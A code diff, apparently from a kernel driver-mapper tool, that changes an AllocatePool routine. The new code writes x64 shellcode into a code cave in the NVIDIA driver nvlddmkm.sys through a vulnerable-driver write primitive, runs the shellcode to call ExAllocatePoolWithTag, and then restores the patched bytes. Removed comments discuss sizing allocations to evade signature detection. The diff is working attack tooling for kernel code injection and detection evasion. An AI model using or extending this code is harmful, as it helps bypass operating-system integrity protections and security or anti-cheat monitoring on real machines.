@@ -680,33 +680,29 @@ uint64_t intel_driver::AllocatePool(nt::POOL_TYPE pool_type, uint64_t size) {
 	if (!size)
 		return 0;
 
-	// [修改] 移除强制 2MB 大小的逻辑
-	// 改为动态大小：确保按照 4KB (0x1000) 页对齐即可
-	// 正常的驱动加载器都会按页对齐申请内存
+	// [动态大小] 向上取整到 4KB (0x1000) 页对齐
 	if (size % 0x1000 != 0) {
-		size = (size & ~(0xFFF)) + 0x1000;
+		size = ((size / 0x1000) + 1) * 0x1000;
 	}
 
-	// 可以在这里添加少量的随机 Padding（例如 0-256 字节），防止大小完全固定匹配特征
-	// 但通常只要不使用巨大的固定值（如 0x200000），这就足够安全了
-
-	// 1. 获取内核函数 ExAllocatePoolWithTag 的真实地址
+	// 1. 获取 ExAllocatePoolWithTag 地址
 	static uint64_t kernel_ExAllocatePool = GetKernelModuleExport(intel_driver::ntoskrnlAddr, "ExAllocatePoolWithTag");
 	if (!kernel_ExAllocatePool) {
 		kdmLog(L"[!] Failed to find ExAllocatePool" << std::endl);
 		return 0;
 	}
 
-	// 2. 获取 nvlddmkm.sys (NVIDIA 驱动) 的基址
+	// 2. 获取 nvlddmkm.sys 基址
 	uint64_t nv_base = kdmUtils::GetKernelModuleAddress("nvlddmkm.sys");
 	if (!nv_base) {
-		kdmLog(L"[-] nvlddmkm.sys not found. Ensure NVIDIA driver is loaded." << std::endl);
+		kdmLog(L"[-] nvlddmkm.sys not found" << std::endl);
 		return 0;
 	}
 
-	// 3. 在 nvlddmkm.sys 中寻找 Code Cave
-	constexpr uint32_t shellcode_size = 13;
-	constexpr uint32_t search_size = 15;
+	// 3. 寻找 Code Cave (.text 段)
+	// Shellcode 变长了，现在需要 21 字节
+	constexpr uint32_t shellcode_size = 21;
+	constexpr uint32_t search_size = 25;    // 搜索稍微大一点的空间
 
 	BYTE cave_pattern[search_size];
 	char cave_mask[search_size + 1];
@@ -716,53 +712,76 @@ uint64_t intel_driver::AllocatePool(nt::POOL_TYPE pool_type, uint64_t size) {
 	}
 	cave_mask[search_size] = '\0';
 
-	// 优先在 PAGE 段搜索
-	uint64_t codecave = intel_driver::FindPatternInSectionAtKernel("PAGE", nv_base, cave_pattern, cave_mask);
-	if (!codecave) {
-		codecave = intel_driver::FindPatternInSectionAtKernel(".text", nv_base, cave_pattern, cave_mask);
-	}
+	// 仅搜索 .text 段，防止缺页崩溃
+	uint64_t codecave = intel_driver::FindPatternInSectionAtKernel(".text", nv_base, cave_pattern, cave_mask);
 
 	if (!codecave) {
-		kdmLog(L"[-] Failed to find suitable Code Cave in nvlddmkm.sys" << std::endl);
+		kdmLog(L"[-] Failed to find Code Cave in nvlddmkm.sys .text section" << std::endl);
 		return 0;
 	}
 
-	kdmLog(L"[+] Found Code Cave at: 0x" << reinterpret_cast<void*>(codecave) << std::endl);
+	kdmLog(L"[+] Found Safe Code Cave at: 0x" << reinterpret_cast<void*>(codecave) << std::endl);
 
-	// 4. 构造 Shellcode (保持不变)
+	// 4. 构造 Shellcode (修复 Stack Alignment 和 Shadow Space)
+	/*
+		sub rsp, 0x28       ; 48 83 EC 28  (开辟 32字节 ShadowSpace + 8字节对齐)
+		mov rax, address    ; 48 B8 ...
+		call rax            ; FF D0
+		add rsp, 0x28       ; 48 83 C4 28  (恢复栈)
+		ret                 ; C3
+	*/
 	BYTE shellcode[shellcode_size] = {
+		0x48, 0x83, 0xEC, 0x28,                                     // sub rsp, 0x28
 		0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, ...
 		0xFF, 0xD0,                                                 // call rax
+		0x48, 0x83, 0xC4, 0x28,                                     // add rsp, 0x28
 		0xC3                                                        // ret
 	};
 
-	*(uint64_t*)(shellcode + 2) = kernel_ExAllocatePool;
+	// 填入 ExAllocatePoolWithTag 地址 (偏移量 4 + 2 = 6)
+	*(uint64_t*)(shellcode + 6) = kernel_ExAllocatePool;
 
-	// 5. 写入 Shellcode
+	// 5. 写入 Shellcode 并验证
 	if (!intel_driver::WriteToReadOnlyMemory(codecave, shellcode, shellcode_size)) {
 		kdmLog(L"[-] Failed to write shellcode to Code Cave" << std::endl);
 		return 0;
 	}
 
+	// [验证步骤] 读回内存确保写入成功
+	BYTE verify_buffer[shellcode_size] = { 0 };
+	if (intel_driver::ReadMemory(codecave, verify_buffer, shellcode_size)) {
+		if (memcmp(shellcode, verify_buffer, shellcode_size) != 0) {
+			kdmLog(L"[-] Shellcode verify failed! Write/Read mismatch." << std::endl);
+			intel_driver::WriteToReadOnlyMemory(codecave, cave_pattern, shellcode_size);
+			return 0;
+		}
+	}
+	else {
+		kdmLog(L"[-] Failed to read back Code Cave for verification" << std::endl);
+		return 0;
+	}
+
 	// 6. 执行 Shellcode
-	// 参数直接透传：size 现在是经过对齐的动态大小
 	uint64_t allocated_pool = 0;
+	// PoolType (RCX), Size (RDX), Tag (R8) -> 'AdvN'
 	if (!CallKernelFunction(&allocated_pool, codecave, pool_type, size, 'AdvN')) {
-		kdmLog(L"[-] Failed to execute Shellcode in Code Cave" << std::endl);
+		kdmLog(L"[-] Failed to execute Shellcode" << std::endl);
 		intel_driver::WriteToReadOnlyMemory(codecave, cave_pattern, shellcode_size);
 		return 0;
 	}
 
-	// 7. 恢复 Code Cave
+	// 7. 恢复现场
 	if (!intel_driver::WriteToReadOnlyMemory(codecave, cave_pattern, shellcode_size)) {
 		kdmLog(L"[!] CRITICAL: Failed to restore Code Cave!" << std::endl);
 	}
 	else {
-		kdmLog(L"[+] Code Cave restored successfully" << std::endl);
+		kdmLog(L"[+] Code Cave restored" << std::endl);
 	}
 
 	return allocated_pool;
 }
+
+
 bool intel_driver::FreePool(uint64_t address) {
 	if (!address)
 		return 0;
